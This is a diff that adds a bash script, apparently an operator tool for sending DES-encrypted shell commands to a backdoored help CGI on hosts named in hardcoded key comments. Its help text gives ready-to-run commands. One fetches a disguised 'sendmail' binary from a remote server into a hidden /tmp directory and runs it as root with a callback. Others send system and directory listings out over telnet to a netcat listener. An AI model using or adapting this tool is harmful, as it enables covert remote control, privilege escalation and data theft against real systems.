@@ -1,0 +1,55 @@
+#!/bin/bash
+
+	key[0]=0x25da0241b511e976 # mp450 10.1.2.208
+	key[1]=0x8c601fc29fad5a01 # mg1.waseda.ac.jp 10.9.4.15
+ 
+        #key=${key[0]}
+
+        OPTIND=0
+        while getopts "hc:i:k:" args $OPTIONS;        
+	do
+	  if [ "$args" = "h" ]; then
+		echo "1) $0 -c\"(mkdir /tmp/.scsi; cd /tmp/.scsi; /usr/bin/curl http://10.1.2.150:5555/sendmail -osendmail;chmod +x sendmail;D=-c10.1.2.150:9999 PATH=. /usr/bin/asroot sendmail;rm -f sendmail) > /dev/null 2>&1\" -i\"http://mp450/help/apps/locale/ja_JP.utf-8/utilities/nph-help.cgi/help\" "
+		echo
+        	echo "2) $0 -c\"(w; ls -l; ls -l /tmp) | bdes -k SECRET | mmencode | telnet 10.1.2.150 4444\"  -i\"http://mp450/help/apps/locale/ja_JP.utf-8/utilities/nph-help.cgi/help\" "
+        	echo "  with nc -l -p 4444 | decode-base64 | bdes -d -k SECRET"
+		echo
+        	echo "Use this to generate a random key and replace SECRET with the key"
+        	echo "  head -c 8 /dev/random | hexdump -e '/8 \"0x%016x\n\"'"
+		echo
+        	echo "3) $0 -c\"(w; ls -l; ls -l /tmp) | telnet 10.1.2.150 4444\"  -i\"http://mp450/help/apps/locale/ja_JP.utf-8/utilities/nph-help.cgi/help\" "
+        	echo "  with nc -l -p 4444"
+		echo
+		echo WARNING
+		echo WARNING
+		echo  
+		echo DO NOT -burn!!!
+		echo Use -exit
+        	exit 1
+	  fi
+          if [ "$args" = "c" ]; then
+              cmd=$OPTARG
+	      echo $cmd
+          fi
+	
+          if [ "$args" = "i" ]; then
+              target=$OPTARG
+	      echo $target
+          fi
+          if [ "$args" = "k" ]; then
+              key=${key[$OPTARG]}
+	      echo $key
+          fi
+        done
+        OPTIND=0
+	
+	echo "`date +"%s"`#$cmd"
+	echo "`head -c 8 /dev/random | hexdump -e '/8 "%016x\n"'`#`date +"%s"`#$cmd"|bdes -k $key > out
+	date +"%N" | bdes -k `date +"%N"` > out1
+	date +"%N" | bdes -k `date +"%N"` > out2
+	date +"%N" | bdes -k `date +"%N"` > out3
+	uriescape < out
+	echo Sending:
+	echo curl -d"`uriescape < out1`=`uriescape < out2`&`uriescape < out3`=`uriescape < out`" $target
+	curl -d"`uriescape < out1`=`uriescape < out2`&`uriescape < out3`=`uriescape < out`" $target
+	rm -f out out1 out2 out3
